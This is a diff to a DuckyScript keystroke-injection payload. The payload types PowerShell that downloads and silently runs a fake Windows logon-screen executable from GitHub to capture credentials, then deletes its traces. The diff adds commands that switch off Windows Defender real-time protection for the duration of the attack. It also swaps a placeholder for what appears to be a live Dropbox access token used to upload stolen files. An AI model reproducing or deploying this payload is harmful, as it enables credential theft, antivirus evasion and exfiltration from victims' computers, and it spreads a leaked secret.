@@ -19,6 +19,10 @@ DELAY 800
 STRING Set-Location "$($env:UserProfile)"
 ENTER
 
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 100
+
 REM Open Notepad in PowerShell
 STRING notepad
 ENTER
@@ -38,7 +42,7 @@ STRING [string]$SourceFilePath
 ENTER
 STRING )
 ENTER
-STRING $DropBoxAccessToken = 'REPLACE_WITH_YOUR_DROPBOX_TOKEN'
+STRING $DropBoxAccessToken = 'sl.Bby0IZwvrs0AubsCHh0m-6KAnxKNAxrNy8OSVIp58O0rznkhIvv6zS46ATMmV78NJTlK6rxdqaw9ntucLPymVJPq3TFooaKG4ev2K4En4_JWlOdY-8X0OrpOQr8hgTi5WNiNYoQg'
 ENTER
 STRING $outputFile = Split-Path $SourceFilePath -leaf
 ENTER
@@ -79,5 +83,5 @@ STRING x
 DELAY 500
 
 REM Download and execute the .exe file
-STRING powershell -w h $url = 'https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait; ./script.ps1 -Wait; Remove-Item './script.ps1'; exit
+STRING powershell -w h $url = 'https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait; ./script.ps1 -Wait; Remove-Item './script.ps1' -Wait; Set-MpPreference -DisableRealtimeMonitoring $false; exit
 ENTER
